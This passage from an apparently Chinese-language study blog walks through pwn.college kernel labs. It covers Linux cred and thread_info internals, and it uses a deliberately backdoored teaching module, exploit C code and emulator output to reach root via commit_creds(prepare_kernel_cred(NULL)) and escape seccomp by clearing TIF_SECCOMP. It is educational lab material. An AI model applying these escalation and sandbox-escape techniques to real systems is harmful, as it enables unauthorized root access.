class="hljs-comment">//...</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>task_struct</code>中包含三个<code>cred</code>结构体，该结构体决定了进程的权限。参考该<a href="https://github.com/g0dA/linuxStack/blob/master/kernel-%E6%9D%83%E9%99%90%E4%B8%8E%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.md">文章</a>，一般情况下，<code>cred</code>决定进程权限；进程间通信时，<code>cred</code>为主体凭证，<code>real_cred</code>为客体凭证，被访问的进程需要使用<code>real_cred</code>来验证对方的权限；<code>ptracer_cred</code>用于<code>ptrace</code>调试时验证<code>tracer</code>的权限防止发送越权。所以大部分情况下，我们关注最下方的<code>cred</code>就够了。</p><p><code>cred</code>结构体在linux源码中位于<a href="https://elixir.bootlin.com/linux/v6.8-rc7/source/include/linux/cred.h"><code>include/linux/cred.h</code></a>,<code>v6.8-rc7</code>的<code>cred</code>源码结合视频省略部份内容后如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br><span class="hljs-type">atomic_long_t</span>usage;<br><span class="hljs-type">kuid_t</span>uid;<span class="hljs-comment">/* real UID of the task */</span><br><span class="hljs-type">kgid_t</span>gid;<span class="hljs-comment">/* real GID of the task */</span><br><span class="hljs-type">kuid_t</span>suid;<span class="hljs-comment">/* saved UID of the task */</span><br><span class="hljs-type">kgid_t</span>sgid;<span class="hljs-comment">/* saved GID of the task */</span><br><span class="hljs-type">kuid_t</span>euid;<span class="hljs-comment">/* effective UID of the task */</span><br><span class="hljs-type">kgid_t</span>egid;<span class="hljs-comment">/* effective GID of the task */</span><br><span class="hljs-type">kuid_t</span>fsuid;<span class="hljs-comment">/* UID for VFS ops */</span><br><span class="hljs-type">kgid_t</span>fsgid;<span class="hljs-comment">/* GID for VFS ops */</span><br><span class="hljs-type">unsigned</span>securebits;<span class="hljs-comment">/* SUID-less security management */</span><br><span class="hljs-type">kernel_cap_t</span>cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br><span class="hljs-type">kernel_cap_t</span>cap_permitted;<span class="hljs-comment">/* caps we&#x27;re permitted */</span><br><span class="hljs-type">kernel_cap_t</span>cap_effective;<span class="hljs-comment">/* caps we can actually use */</span><br><span class="hljs-type">kernel_cap_t</span>cap_bset;<span class="hljs-comment">/* capability bounding set */</span><br><span class="hljs-type">kernel_cap_t</span>cap_ambient;<span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-comment">//...</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>将<code>euid</code>置0即可实现对应进程的权限提升。</p><p><strong>生成和设置进程的<code>cred</code>结构体</strong></p><p>手动构造和修改cred结构体是十分低效且易出错的，我们可以通过内核态的两个API函数快速完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> cred * <span class="hljs-title function_">prepare_kernel_cred</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *reference_task_struct)</span>     <span class="hljs-comment">//创建cred结构体</span><br><span class="hljs-title function_">commit_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> cred *)</span>         <span class="hljs-comment">//用参数中的cred结构体替换当前进程的cred结构体</span><br></code></pre></td></tr></table></figure><p>调用<code>prepare_kernel_cred</code>时，如果参数为0，则以<code>init</code>进程的<code>cred</code>为模板复制出新的<code>cred</code>；参数指向一个<code>task_struct</code>时，以该<code>task_struct</code>的<code>read_cred</code>为模板复制出新的<code>cred</code>。而<code>init</code>进程是内核启动的第一个用户态进程，拥有几乎不受限制的用户态权限，也就是<code>root</code>。</p><p>因此，可以通过<code>prepare_kernel_cred(0)</code>生成一个对应root权限的<code>cred</code>结构体。</p><p><strong>cred提权示例</strong></p><p><code>make_root.ko</code>示例内核模块的ioctl接口存在后门，当<code>ioctl_num</code>(即原型中的<code>cmd</code>参数)为<code>_IO(&#39;p&#39;, 1)</code>且<code>ioctl_param</code>等于0x13371337时，进行<code>进程权限提升</code>;<code>ioctl_param</code>等于0x31337时，进行<code>seccomp</code>沙箱逃逸</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PWN _IO(<span class="hljs-string">&#x27;p&#x27;</span>, 1)</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl_num, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ioctl_param)</span><br>&#123;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;Got ioctl argument %d!&quot;</span>, ioctl_num);<br>        <span class="hljs-keyword">if</span> (ioctl_num == PWN)<br>        &#123;<br>                <span class="hljs-keyword">if</span> (ioctl_param == <span class="hljs-number">0x13371337</span>)<br>                &#123;<br>                        printk(KERN_ALERT <span class="hljs-string">&quot;Granting root access!&quot;</span>);<br>                        commit_creds(prepare_kernel_cred(<span class="hljs-literal">NULL</span>));<br>                &#125;<br>                <span class="hljs-keyword">if</span> (ioctl_param == <span class="hljs-number">0x31337</span>)<br>                &#123;<br>                        printk(KERN_ALERT <span class="hljs-string">&quot;Escaping seccomp!&quot;</span>);<br>                        printk(KERN_ALERT <span class="hljs-string">&quot;FLAGS BEFORE: %lx&quot;</span>, current-&gt;thread_info.flags);<br>                        current-&gt;thread_info.flags &amp;= ~_TIF_SECCOMP;<br>                        printk(KERN_ALERT <span class="hljs-string">&quot;FLAGS AFTER: %lx&quot;</span>, current-&gt;thread_info.flags);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>仿真环境中装载模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ # insmod make_root.ko<br>[125133.671290] make_root: loading out-of-tree module taints kernel.<br>/ # lsmod<br>make_root 16384 0 - Live 0xffffffffc0000000 (O)<br>/ # ls /proc/pwn-college-root <br>/proc/pwn-college-root<br></code></pre></td></tr></table></figure><p>使用objdump反汇编make_root.ko得到<code>_IO(&#39;p&#39;, 1)</code>值为0x7001</p><p>宿主机编译并将交互程序放到共享文件夹，交互代码(exp)如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwn-college-root&quot;</span>,<span class="hljs-number">0</span>);<br>        assert(fd&gt;<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BEFORE uid: %d\n&quot;</span>,getuid());<br>        ioctl(fd,<span class="hljs-number">0x7001</span>,<span class="hljs-number">0x13371337</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AFTER uid: %d\n&quot;</span>,getuid());<br>        execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">//gcc -o make_root_exp -static make_root_exp.c</span><br></code></pre></td></tr></table></figure><p>仿真环境运行exp，提权成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">/home/ctf/Desktop/pwn.college/temp # su ctf<br>sh: can&#x27;t access tty; job control turned off<br>~/Desktop/pwn.college/temp $ id<br>uid=1000(ctf) gid=1000 groups=1000<br>~/Desktop/pwn.college/temp $ ./make_root_exp<br>[128660.788016] Granting root access!<br>BEFORE uid: 1000<br>[128843.406341] Device opened.<br>[128843.411310] Got ioctl argument 28673!<br>AFTER uid: 0<br>/bin/sh: can&#x27;t access tty; job control turned off<br>/home/ctf/Desktop/pwn.college/temp # id<br>uid=0(root) gid=0<br></code></pre></td></tr></table></figure><p><strong>获取<code>commit_creds</code>和<code>prepare_kernel_cred</code>在内核中的地址</strong></p><p>1.较旧版本内核或关闭了KASLR的内核(例如许多嵌入式设备禁用了KASLR)中，函数映射在可预测的固定地址。</p><p>2.<code>/proc/kallsym</code>是内核提供给<code>root</code>用户的符号地址查看接口。</p><p>3.如果开启了调试接口，可以使用gdb调试获取地址</p><p>4.和用户态一样，泄露KASLR的偏移，通过和固定地址相加的到函数地址</p><h3 id="Escaping-Seccomp"><a href="#Escaping-Seccomp" class="headerlink" title="Escaping Seccomp"></a>Escaping Seccomp</h3><p>本节主要讲通过内核漏洞进行seccomp沙箱逃逸</p><p>seccomp是一种内核沙箱技术，可以限制系统调用的使用。一个正确设置的沙箱几乎是不可能突破的，除非你能使用特定的系统调用和这些内核模块交互并触发内核漏洞，从seccomp沙箱中逃离。</p><p>有大量沙箱逃逸的案例，比如chrome沙箱。该<a href="https://github.com/allpaca/chrome-sbx-db">github仓库</a>收录了一些2020年及以前的chrome沙箱逃逸漏洞和chrome沙箱逃逸的学习资料。</p><p>上节说到的<code>task_struct</code><a href="https://elixir.bootlin.com/linux/v6.8-rc7/source/include/linux/sched.h">源码</a>中，还存在<code>thread_info</code>结构体，该结构体的<code>flags</code>成员有多个不同作用的比特位，其中一个名为<code>TIF_SECCOMP</code>的比特位定义了seccomp沙箱是否开启。</p><p><strong>读源码</strong></p><p><code>thread_info</code>在Linux源码中位于<a href="https://elixir.bootlin.com/linux/v5.10/source/arch/x86/include/asm/thread_info.h"><code>/arch/x86/include/asm/thread_info.h</code></a></p><p>由于<code>TIF_SECCOMP</code>位在v5.11及之后版本的Linux内核中被回收并迁移，这里改用v5.10的源码。v5.11的具体改动内容在本节最后介绍。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>&#123;</span><br><span class="hljs-comment">//LOTS of stuff,including</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">cred</span>;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>flags;<span class="hljs-comment">/* low level flags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>syscall_work;<span class="hljs-comment">/* SYSCALL_WORK_ flags */</span><br>u32status;<span class="hljs-comment">/* thread synchronous flags */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SMP</span><br>u32cpu;<span class="hljs-comment">/* current CPU */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>flags中第9位(从0开始下标为8)是<code>TIF_SECCOMP</code>位，为1表示开启seccomp，0表示关闭，相关源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIF_SECCOMP8<span class="hljs-comment">/* secure computing */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _TIF_SECCOMP(1 &lt;&lt; TIF_SECCOMP)</span><br></code></pre></td></tr></table></figure><p>seccomp启动时相关源码</p><p><a href="https://elixir.bootlin.com/linux/v5.10/source/include/linux/seccomp.h#L45">&#x2F;include&#x2F;linux&#x2F;seccomp.h</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">secure_computing</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">if</span> (unlikely(test_thread_flag(TIF_SECCOMP)))<br><span class="hljs-keyword">return</span>  __secure_computing(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="/kernel/seccomp.c">&#x2F;kernel&#x2F;seccomp.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __secure_computing(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seccomp_data *sd)<br>&#123;<br><span class="hljs-type">int</span> mode = current-&gt;seccomp.mode;<br><span class="hljs-type">int</span> this_syscall;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) &amp;&amp;<br>    unlikely(current-&gt;ptrace &amp; PT_SUSPEND_SECCOMP))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>this_syscall = sd ? sd-&gt;nr :<br>syscall_get_nr(current, current_pt_regs());<br><br><span class="hljs-keyword">switch</span> (mode) &#123;<br><span class="hljs-keyword">case</span> SECCOMP_MODE_STRICT:<br>__secure_computing_strict(this_syscall);  <span class="hljs-comment">/* may call do_exit */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> SECCOMP_MODE_FILTER:<br><span class="hljs-keyword">return</span> __seccomp_filter(this_syscall, sd, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">default</span>:<br>BUG();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><p>要逃出seccomp沙箱，我们只需要在内核空间将当前进程的<code>task_struct</code>-&gt;<code>thread_info</code>-&gt;<code>flags</code>的<code>TIF_SECCOMP</code>位置0.</p><p>那么如何得到当前进程的<code>task_struct</code>地址呢？</p><p>内核中的段寄存器<code>gs</code>指向了当前进程的<code>task_struct</code>，在内核开发时，我们只需要使用<code>current</code>来指代当前进程的<code>task_struct</code>即可。代码实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">current-&gt;thread_info.flags &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; TIF_SECCCOMP);<br><span class="hljs-comment">//TIF_SECCOMP = 8 </span><br><span class="hljs-comment">//_TIF_SECCOMP=(1 &lt;&lt; TIF_SECCCOMP)</span><br></code></pre></td></tr></table></figure><p>需要注意的是，<strong>子进程依然会开启seccomp</strong>，子进程是否开启seccomp由其它标志位决定。</p><p><strong>漏洞利用示例</strong></p><p>依旧使用github仓库kernel模块中<code>src</code>目录下的<code>make_root</code>示例内核模块 。</p><p>在交互时，将命令码设置为PWN(0x7001)，<code>ioctl_param</code>设置为0x13371337将当前进程提权至root；<code>ioctl_param</code>设置为0x31337关闭seccomp沙箱</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl_num, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ioctl_param)</span><br>&#123;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;Got ioctl argument %d!&quot;</span>, ioctl_num);<br>        <span class="hljs-keyword">if</span> (ioctl_num == PWN)<br>        &#123;<br>        <span class="hljs-keyword">if</span> (ioctl_param == <span class="hljs-number">0x13371337</span>)<br>        &#123;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;Granting root access!&quot;</span>);<br>    commit_creds(prepare_kernel_cred(<span class="hljs-literal">NULL</span>));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ioctl_param == <span class="hljs-number">0x31337</span>)<br>    &#123;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;Escaping seccomp!&quot;</span>);<br>        printk(KERN_ALERT <span class="hljs-string">&quot;FLAGS BEFORE: %lx&quot;</span>, current-&gt;thread_info.flags);<br>    current-&gt;thread_info.flags &amp;= ~_TIF_SECCOMP;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;FLAGS AFTER: %lx&quot;</span>, current-&gt;thread_info.flags);<br>    &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写exploit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE 1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/sendfile.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;BREAKING OUT!\n&quot;</span>);<br>        ioctl(fd,<span class="hljs-number">0x7001</span>,<span class="hljs-number">0x31337</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Pre-root uid: %d\n&quot;</span>,getuid());<br>        ioctl(fd,<span class="hljs-number">0x7001</span>,<span class="hljs-number">0x13371337</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Post-root uid: %d\n&quot;</span>,getuid());<br><br>        <span class="hljs-type">int</span> flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>        assert(flag_fd &gt; <span class="hljs-number">0</span>);<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> n = read(flag_fd, buf, <span class="hljs-number">1024</span>);<br>        assert(n &gt; <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">puts</span>(buf);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwn-college-root&quot;</span>,<span class="hljs-number">0</span>);<br>        assert(fd&gt;<span class="hljs-number">0</span>);<br><br>        setresuid(<span class="hljs-number">1234</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1234</span>);   <span class="hljs-comment">//降权</span><br><br>        scmp_filter_ctx ctx;<br>        ctx = seccomp_init(SCMP_ACT_ERRNO(<span class="hljs-number">1337</span>));   <span class="hljs-comment">//禁用所有系统调用并返回1337</span><br>        assert(seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(ioctl),<span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);  <span class="hljs-comment">//允许ioctl、read、write</span><br>        assert(seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(read),<span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>        assert(seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(write),<span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>        assert(seccomp_load(ctx) == <span class="hljs-number">0</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before breaking out...&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Trying getuid(): %d\n&quot;</span>,getuid());<br><br>        attack(fd);<br>&#125;<br><span class="hljs-comment">//gcc -static -o seccomp_escape seccomp_escape.c -lseccomp</span><br></code></pre></td></tr></table></figure><p>编译后在仿真环境中运行，提权和逃逸成功，得到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">/home/ctf/Desktop/pwn.college/temp # ./seccomp_escape<br>[  787.730808] Device closed.<br>[  849.729537] Device opened.<br>[  849.747593] Got ioctl argument 28673!<br>[  849.747732] Escaping seccomp!<br>[  849.747866] FLAGS BEFORE: 100<br>[  849.747968] FLAGS AFTER: 0<br>[  849.748103] Got ioctl argument 28673!<br>Before breaking out...Trying getuid(): -1337<br>BREAKING OUT!<br>Pre-root uid: 1234<br>Post-root uid: 0<br>pwn_college&#123;31337&#125;<br><br>[  849.748208] Granting root access!<br></code></pre></td></tr></table></figure><h4 id="拓展内容-linux内核v5-11相关更新"><a href="#拓展内容-linux内核v5-11相关更新" class="headerlink" title="拓展内容-linux内核v5.11相关更新"></a><strong>拓展内容-linux内核v5.11相关更新</strong></h4><p>笔者在阅读源码时发现，从Linux内核版本<code>v5.11</code>开始，<code>TIF_SECCOMP</code>位已经被去除，也就是说从5.10到5.11做了相应的更新。在<code>Thomas Gleixner</code>向<code>Linus Torvalds</code>提出的<a href="https://lore.kernel.org/lkml/160799891083.23883.2114675003525545559.pr-tracker-bot@kernel.org/t/#Z2e.:..:160797732939.10793.9152151866806316627.tglx::40nanos:1arch:x86:include:asm:thread_info.h">Linux内核更新建议</a>中，提到了如下回收并转移x86中部分TIF位的建议：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">- The consolidation <span class="hljs-keyword">work</span> <span class="hljs-keyword">to</span> reclaim TIF flags <span class="hljs-keyword">on</span> x86 <span class="hljs-keyword">and</span> <span class="hljs-keyword">also</span> <span class="hljs-keyword">for</span> non-x86    specific TIF flags which are solely relevant <span class="hljs-keyword">for</span> syscall related <span class="hljs-keyword">work</span>    <span class="hljs-keyword">and</span> have been moved <span class="hljs-keyword">into</span> their own <span class="hljs-keyword">storage</span> space. The x86 specific part    had <span class="hljs-keyword">to</span> be merged <span class="hljs-keyword">in</span> <span class="hljs-keyword">to</span> avoid a major <span class="hljs-keyword">conflict</span>.<br></code></pre></td></tr></table></figure><p>但是<code>TIP_SECCOMP</code>位并不是<code>Thomas Gleixner</code>删除的，该工作由<code>Gabriel Krisman Bertazi</code>完成。事实上，Linux5.11版本的更新由多人共同完成，如下</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240305205034.png" alt="2"></p><p>可以发现定义<code>seccomp</code>是否开启的比特位由<code>thread_info</code>的<code>flags</code>成员转移到了<code>syscall_work</code>成员。</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">seccomp<span class="hljs-operator">:</span> Migrate <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> SYSCALL_WORK flag  <br></code></pre></td></tr></table></figure><p>在更新建议页面搜索<code>TIF_SECCOMP</code>字符串，根据<code>kernel/seccomp.c</code>的注释可知其被<code>SYSCALL_WORK_SECCOMP</code>取代。</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240305210302.png" alt="3"></p><p>在<a href="https://elixir.bootlin.com/linux/v5.11-rc1/source/include/linux/thread_info.h#L48">v5.11-rc1的linux源码</a>中查找<code>SYSCALL_WORK_SECCOMP</code>,发现其在<code>include/linux/thread_info.h</code>被定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 